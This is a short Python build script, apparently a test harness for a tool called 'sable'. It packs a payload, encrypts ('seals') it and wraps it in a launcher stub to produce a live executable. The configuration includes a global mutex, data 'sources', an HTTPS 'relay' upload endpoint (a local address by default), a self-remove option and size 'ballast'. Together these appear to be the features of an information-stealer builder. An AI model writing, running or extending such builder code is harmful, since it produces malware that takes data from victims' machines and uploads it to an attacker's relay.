"""Build a real artifact pointed at a local relay.

Same calls the application makes: payload, seal, trailer, container.
"""

from __future__ import annotations

import sys
from pathlib import Path

ROOT = Path(r"C:\Users\Kuzenee\Desktop\55555\sable")
sys.path.insert(0, str(ROOT))

from core import forge, seal  # noqa: E402
from core.schema import (  # noqa: E402
    SCHEMA_VERSION,
    RelayConfig,
    RunConfig,
    SourceConfig,
)

ENDPOINT = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:8099/upload"
DESTINATION = Path(sys.argv[2] if len(sys.argv) > 2 else r"C:\Users\Kuzenee\Desktop\55555\_harness\out\sable-live.exe")
STUB = ROOT / "tools" / "dist" / "sable-launcher.exe"

cfg = RunConfig(
    schema_version=SCHEMA_VERSION,
    mutex=r"Global\SableLiveProbe",
    seal_key="bench-live-probe-key",
    relay=RelayConfig(kind="https", endpoint=ENDPOINT),
    sources=SourceConfig(),
    self_remove=False,
    ballast_mb=0,
)

archive = forge.payload(ROOT, cfg)
print(f"payload        {len(archive)} bytes")

sealed = seal.seal(archive, cfg.seal_key)
print(f"sealed         {len(sealed)} bytes")

if not STUB.is_file():
    raise SystemExit(f"stub missing: {STUB}")

DESTINATION.parent.mkdir(parents=True, exist_ok=True)
forge.build(cfg, sealed, DESTINATION, mode="exe", stub=STUB)
print(f"artifact       {DESTINATION}  {DESTINATION.stat().st_size} bytes")
print(f"relay          {ENDPOINT}")
